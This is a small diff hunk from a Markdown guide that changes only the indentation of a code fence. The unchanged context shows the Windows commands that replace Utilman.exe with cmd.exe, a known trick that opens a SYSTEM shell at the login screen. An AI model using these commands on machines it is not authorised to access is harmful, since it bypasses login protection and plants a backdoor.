@@ -16,7 +16,7 @@
     cd Windows\System32
     ren Utilman.exe Ulilman.exe.old
     copy cmd.exe Utilman.exe
-    ```
+ ```
 
 <img width="676" height="58" alt="image" src="https://github.com/user-attachments/assets/4e1150d4-3fc2-4bdc-b3f3-6778884e64e1" />
 
